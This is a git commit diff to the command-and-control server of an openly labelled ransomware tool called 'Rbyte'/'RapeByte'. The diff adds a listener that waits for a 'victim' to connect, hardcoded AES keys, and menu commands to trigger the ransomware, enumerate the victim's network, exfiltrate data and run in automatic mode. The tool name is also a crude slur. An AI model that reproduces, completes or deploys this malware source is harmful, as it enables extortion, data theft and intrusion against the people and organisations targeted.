60714440170f23897a63e74caa2c2147c50a55c5
SxNade <73271976+SxNade@users.noreply.github.com>
2021-03-05 12:38:14 -0500

    Update rbyte.py

--- Server/rbyte.py
+++ Server/rbyte.py
@@ -1,6 +1,4 @@
 #Rbyte the user server
-#Under Development
-#Updated Everyday
 import socket
 import os
 from termcolor import colored
@@ -10,6 +8,9 @@ import os
 import sys
 import time
 
+#Kind of Log File **
+
+os.system("echo RapeByte Initiated:::::[$(date)] >> rbyte.log ")
 keys = {
     'enc0': 'A3317AF79FEB1C1778E27AFE728BEF8B',
     'enc1': '4CB54FEC78114473387BD86400EDF85B',
@@ -25,11 +26,25 @@ log = '''
 _/_____|__(___/_(___/_(_ __(___ _
                    /             
                (_ /              
+                    (For Linux)
             
-            https://github.com/SxNade
-
-Contact: SxNade@protonmail.com
+https://github.com/SxNade   :|: SxNade@protonmail.com
+                    
 '''
+
+usage = '''
+                            #USAGE#
+                python3 rbyte.py <listening-IP-address>
+
+                Example:: python3 rbyte.py 192.168.1.100
+'''
+if len(sys.argv) != 2:
+    print(log)
+    print("\n")
+    print(usage)
+    sys.exit()
+
+O = colored("0)", 'red')
 A = colored("1)", 'red')
 B = colored("2)", 'red')
 C = colored("3)", 'red')
@@ -37,17 +52,21 @@ D = colored("3)", 'red')
 
 commands = f'''
 #Please Read the man.txt file for info on options#
-
+{O} start [To start  Rbyte]
 {A} run [trigger the ransomware will perform enum&exfil] ::
 {B} enum [will enumerate the network] ::
 {C} exfil [will start exfiltrating data] ::
-{D} cgenc [will renew the encryption key] :: use with caution
+{D} auto [will work in automatic mode] :: use with caution
 
 '''
 
 print(log)
 print("[*] Loading First Encryption Key\n")
 print(commands)
+
+
+def delv_enum():
+    os.system("")
 
 def svr():
     global s
@@ -58,6 +77,7 @@ def svr():
     print(colored("\n[+] Command Server is Active Now Awaiting For Victim to Connect\n", 'green'))
     conn , addr = s.accept()
     print(f"[*] {addr} Successfully Connected")
+    print(colored("[+] Please Note This Reverse Connection IP for Furthur use", "red", attrs=['bold']))
 
 def key_gen():
     print(colored("[+]Initializing Encryption Channel", 'green'))
@@ -68,17 +88,37 @@ def start_encryption(key):
     global magic
     magic = AES.new(f'{enc_key}', AES.MODE_CFB, 'This is an IV456') #StackOverflow LOL!
 
+
+def recv_send_data(metadata='error'):
+    usr = metadata.encode()
+    usr_send = magic.encrypt(usr)
+    conn.send(usr_send)
+    In_messg = conn.recv(8192)
+    recv_data_enc = magic.decrypt(In_messg)
+    global recv_data_dec
+    recv_data_dec = recv_data_enc.decode()
+
 def run():
     print(colored("[*] FiringUp Rapebyte Now..."))
     while True:
         usr = input(colored("\nRbyte~$ "))
-        usr = usr.encode()
-        usr_send = magic.encrypt(usr)
-        conn.send(usr_send)
-        In_messg = conn.recv(8192)
-        recv_data_enc = magic.decrypt(In_messg)
-        recv_data_dec = recv_data_enc.decode()
-        print(recv_data_dec)
+        if usr == 'run':
+            recv_send_data(usr)
+        elif usr == 'enum':
+            os.system("echo 'Enumeration Selected By $HOSTNAME:::::[$(date)]' >> rbyte.log ")
+            print(colored("[+] Switching To Second Stage Encryption Key", 'red', attrs=['bold']))
+            start_encryption(keys.get('enc0'))
+            recv_send_data(usr)
+            print("[+] Starting Server For Delivering Enumeration Payload:::Runtime set to 60sec")
+        elif usr == 'exfil':
+            recv_send_data(usr)
+        elif usr == 'auto':
+            recv_send_data(usr)
+        elif len(usr) == 0:
+            recv_send_data()
+        else:
+            recv_send_data()
+        print(colored(recv_data_dec, 'green', attrs=['bold']))
 
 
 def main():
@@ -87,7 +127,8 @@ main()
 
 while True:
     usr = input(colored("\nRbyte~$ "))
-    if usr == 'run':
+    if usr == 'start':
         key_gen()
         start_encryption(enc_key)
         run()
+
